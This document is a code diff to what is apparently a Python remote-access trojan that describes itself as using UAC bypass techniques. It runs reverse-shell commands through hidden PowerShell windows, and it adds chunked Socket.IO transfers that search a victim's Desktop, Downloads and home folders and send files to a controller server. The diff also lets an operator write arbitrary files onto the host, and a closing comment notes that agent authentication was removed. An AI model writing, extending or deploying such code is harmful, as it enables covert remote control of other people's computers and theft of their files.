@@ -1,3 +1,4 @@
+#CREATED BY SPHINX
 """
 Advanced Python Agent with UACME-Inspired UAC Bypass Techniques
 
@@ -71,6 +72,7 @@ import asyncio
 import platform
 from collections import defaultdict
 import queue
+import math
 
 # Suppress SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -2765,13 +2767,25 @@ def reverse_shell_handler(agent_id):
                     # Execute regular command
                     try:
                         if WINDOWS_AVAILABLE:
-                            result = subprocess.run(
-                                ["powershell.exe", "-NoProfile", "-Command", command],
-                                capture_output=True,
-                                text=True,
-                                timeout=30,
-                                creationflags=subprocess.CREATE_NO_WINDOW
-                            )
+                            # Fix PowerShell execution - use proper command formatting
+                            if command.strip().lower().startswith('powershell'):
+                                # If it's already a PowerShell command, execute directly
+                                result = subprocess.run(
+                                    ["powershell.exe", "-NoProfile", "-Command", command],
+                                    capture_output=True,
+                                    text=True,
+                                    timeout=30,
+                                    creationflags=subprocess.CREATE_NO_WINDOW
+                                )
+                            else:
+                                # For regular commands, wrap in PowerShell properly
+                                result = subprocess.run(
+                                    ["powershell.exe", "-NoProfile", "-Command", f"& {{{command}}}"],
+                                    capture_output=True,
+                                    text=True,
+                                    timeout=30,
+                                    creationflags=subprocess.CREATE_NO_WINDOW
+                                )
                         else:
                             result = subprocess.run(
                                 ["bash", "-c", command],
@@ -3300,54 +3314,198 @@ def stop_clipboard_monitor():
 
 # --- File Management Functions ---
 
+def send_file_chunked_to_controller(file_path, agent_id, destination_path=None):
+    """Send a file to the controller in chunks using Socket.IO."""
+    if not os.path.exists(file_path):
+        return f"File not found: {file_path}"
+    chunk_size = 512 * 1024  # 512KB
+    filename = os.path.basename(file_path)
+    total_size = os.path.getsize(file_path)
+    print(f"Sending file {file_path} ({total_size} bytes) to controller in chunks...")
+    with open(file_path, 'rb') as f:
+        offset = 0
+        chunk_count = 0
+        while True:
+            chunk = f.read(chunk_size)
+            if not chunk:
+                break
+            chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
+            sio.emit('file_chunk_from_agent', {
+                'agent_id': agent_id,
+                'filename': filename,
+                'chunk': chunk_b64,
+                'offset': offset,
+                'total_size': total_size,
+                'destination_path': destination_path or file_path
+            })
+            offset += len(chunk)
+            chunk_count += 1
+            print(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
+    # Notify upload complete
+    sio.emit('upload_file_end', {
+        'agent_id': agent_id,
+        'filename': filename,
+        'destination_path': destination_path or file_path
+    })
+    print(f"File upload complete notification sent for {filename}")
+    return f"File {file_path} sent to controller in {chunk_count} chunks"
+
 def handle_file_upload(command_parts):
-    """Handle file upload from controller."""
+    """Handle file upload from controller (deprecated, now uses chunked)."""
+    return "File upload via HTTP POST is deprecated. Use chunked Socket.IO upload."
+
+def handle_file_download(command_parts, agent_id):
+    """Handle file download request from controller (deprecated, now uses chunked)."""
+    return "File download via HTTP POST is deprecated. Use chunked Socket.IO download."
+
+# --- Socket.IO File Transfer Handlers ---
+
+@sio.on('file_chunk_from_operator')
+def on_file_chunk_from_operator(data):
+    """Receive a file chunk from the operator and write to disk."""
+    print(f"Received file chunk: {data.get('filename', 'unknown')} at offset {data.get('offset', 0)}")
+    filename = data.get('filename')
+    chunk_b64 = data.get('data') or data.get('chunk')
+    offset = data.get('offset', 0)
+    total_size = data.get('total_size', 0)
+    destination_path = data.get('destination_path') or filename
+    
+    print(f"Debug - filename: {filename}, destination_path: {destination_path}, total_size: {total_size}")
+    
+    if not filename or not chunk_b64:
+        print("Invalid file chunk received.")
+        return
+    
+    # Use a temp buffer in memory or on disk
+    if not hasattr(on_file_chunk_from_operator, 'buffers'):
+        on_file_chunk_from_operator.buffers = {}
+    buffers = on_file_chunk_from_operator.buffers
+    
+    if destination_path not in buffers:
+        buffers[destination_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
+    
+    # Remove data: prefix if present
+    if ',' in chunk_b64:
+        chunk_b64 = chunk_b64.split(',', 1)[1]
+    
     try:
-        if len(command_parts) < 3:
-            return "Invalid upload command format"
+        chunk = base64.b64decode(chunk_b64)
+        buffers[destination_path]['chunks'].append((offset, chunk))
         
-        destination_path = command_parts[1]
-        file_content_b64 = command_parts[2]
+        # Check if file is complete
+        received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
+        print(f"File {filename}: received {received_size}/{total_size} bytes")
         
-        # Decode base64 content
-        file_content = base64.b64decode(file_content_b64)
+        # If we have received all chunks or this is the last chunk (total_size might be 0)
+        if total_size > 0 and received_size >= total_size:
+            print(f"File complete: received {received_size}/{total_size} bytes")
+            _save_completed_file(destination_path, buffers[destination_path])
+        elif total_size == 0 and len(buffers[destination_path]['chunks']) > 0:
+            # If total_size is 0, assume this is the only chunk and save immediately
+            print(f"Total size is 0, saving single chunk file immediately")
+            _save_completed_file(destination_path, buffers[destination_path])
+            
+    except Exception as e:
+        print(f"Error processing chunk: {e}")
+
+def _save_completed_file(destination_path, buffer_data):
+    """Save the completed file to disk."""
+    try:
+        # Sort chunks by offset
+        buffer_data['chunks'].sort()
         
         # Ensure directory exists
-        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        dir_path = os.path.dirname(destination_path)
+        if dir_path:
+            os.makedirs(dir_path, exist_ok=True)
         
         # Write file
         with open(destination_path, 'wb') as f:
-            f.write(file_content)
+            for _, chunk in buffer_data['chunks']:
+                f.write(chunk)
         
-        return f"File uploaded successfully to {destination_path}"
+        file_size = sum(len(c[1]) for c in buffer_data['chunks'])
+        print(f"File saved successfully to {destination_path} ({file_size} bytes)")
+        
+        # Clean up buffer
+        if hasattr(on_file_chunk_from_operator, 'buffers'):
+            if destination_path in on_file_chunk_from_operator.buffers:
+                del on_file_chunk_from_operator.buffers[destination_path]
+                
     except Exception as e:
-        return f"File upload failed: {e}"
+        print(f"Error saving file {destination_path}: {e}")
 
-def handle_file_download(command_parts, agent_id):
-    """Handle file download request from controller."""
+@sio.on('file_upload_complete_from_operator')
+def on_file_upload_complete_from_operator(data):
+    filename = data.get('filename')
+    destination_path = data.get('destination_path') or filename
+    print(f"Upload of {filename} to {destination_path} complete.")
+    
+    # Force save any remaining buffered file
+    if hasattr(on_file_chunk_from_operator, 'buffers'):
+        if destination_path in on_file_chunk_from_operator.buffers:
+            print(f"Force saving file {destination_path} from completion event")
+            _save_completed_file(destination_path, on_file_chunk_from_operator.buffers[destination_path])
+
+@sio.on('request_file_chunk_from_agent')
+def on_request_file_chunk_from_agent(data):
+    """Handle file download request from controller - send file in chunks."""
+    print(f"File download request received: {data}")
+    filename = data.get('filename')
+    if not filename:
+        print("Invalid file request - no filename provided")
+        return
+    
+    # Try to find the file in common locations or use the provided path
+    possible_paths = [
+        filename,  # Try as-is first
+        os.path.join(os.getcwd(), filename),  # Current directory
+        os.path.join(os.path.expanduser("~"), filename),  # Home directory
+        os.path.join(os.path.expanduser("~/Desktop"), filename),  # Desktop
+        os.path.join(os.path.expanduser("~/Downloads"), filename),  # Downloads
+        os.path.join("C:/", filename),  # C: root
+        os.path.join("C:/Users/Public", filename),  # Public folder
+    ]
+    
+    file_path = None
+    for path in possible_paths:
+        if os.path.exists(path):
+            file_path = path
+            print(f"Found file at: {file_path}")
+            break
+    
+    if not file_path:
+        print(f"File not found: {filename}")
+        print("Searched in:")
+        for path in possible_paths:
+            print(f"  - {path}")
+        return
+    
     try:
-        if len(command_parts) < 2:
-            return "Invalid download command format"
-        
-        file_path = command_parts[1]
-        
-        if not os.path.exists(file_path):
-            return f"File not found: {file_path}"
-        
-        # Read file and encode as base64
+        chunk_size = 512 * 1024  # 512KB
+        total_size = os.path.getsize(file_path)
+        print(f"Sending file {file_path} ({total_size} bytes) in chunks...")
         with open(file_path, 'rb') as f:
-            file_content = base64.b64encode(f.read()).decode('utf-8')
-        
-        # Send file to controller
-        filename = os.path.basename(file_path)
-        url = f"{SERVER_URL}/file_upload/{agent_id}"
-        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
-        
-        return f"File {file_path} sent to controller"
+            offset = 0
+            chunk_count = 0
+            while True:
+                chunk = f.read(chunk_size)
+                if not chunk:
+                    break
+                chunk_b64 = 'data:application/octet-stream;base64,' + base64.b64encode(chunk).decode('utf-8')
+                sio.emit('file_chunk_from_agent', {
+                    'agent_id': get_or_create_agent_id(),
+                    'filename': os.path.basename(file_path),  # Send just the filename
+                    'chunk': chunk_b64,
+                    'offset': offset,
+                    'total_size': total_size
+                })
+                offset += len(chunk)
+                chunk_count += 1
+                print(f"Sent chunk {chunk_count}: {len(chunk)} bytes at offset {offset}")
+        print(f"File {file_path} sent to controller in {chunk_count} chunks")
     except Exception as e:
-        return f"File download failed: {e}"
-
-# --- Voice Communication Functions ---
+        print(f"Error sending file {file_path}: {e}")
 
 def handle_voice_playback(command_parts):
     """Handle voice playback from controller."""
@@ -6140,9 +6298,42 @@ def on_command(data):
     if command in internal_commands:
         output = internal_commands[command]()
     elif command.startswith("upload-file:"):
-        output = handle_file_upload(command.split(":", 2))
+        # New chunked file upload
+        parts = command.split(":", 2)
+        if len(parts) >= 3:
+            file_path = parts[1]
+            destination_path = parts[2] if len(parts) > 2 else None
+            output = send_file_chunked_to_controller(file_path, agent_id, destination_path)
+        else:
+            output = "Invalid upload command format. Use: upload-file:source_path:destination_path"
     elif command.startswith("download-file:"):
-        output = handle_file_download(command.split(":", 1), agent_id)
+        # New chunked file download - this is handled by Socket.IO events
+        parts = command.split(":", 1)
+        if len(parts) >= 2:
+            file_path = parts[1]
+            # Try to find the file in common locations
+            possible_paths = [
+                file_path,  # Try as-is first
+                os.path.join(os.getcwd(), file_path),  # Current directory
+                os.path.join(os.path.expanduser("~"), file_path),  # Home directory
+                os.path.join(os.path.expanduser("~/Desktop"), file_path),  # Desktop
+                os.path.join(os.path.expanduser("~/Downloads"), file_path),  # Downloads
+                os.path.join("C:/", file_path),  # C: root
+                os.path.join("C:/Users/Public", file_path),  # Public folder
+            ]
+            
+            found_path = None
+            for path in possible_paths:
+                if os.path.exists(path):
+                    found_path = path
+                    break
+            
+            if found_path:
+                output = send_file_chunked_to_controller(found_path, agent_id)
+            else:
+                output = f"File not found: {file_path}"
+        else:
+            output = "Invalid download command format. Use: download-file:file_path"
     elif command.startswith("play-voice:"):
         output = handle_voice_playback(command.split(":", 1))
     elif command != "sleep":
@@ -6578,3 +6769,5 @@ if __name__ == "__main__":
         # Clear sensitive memory with multiple methods
         if STEALTH_AVAILABLE:
             clear_memory()
+
+# Agent authentication removed - direct access enabled
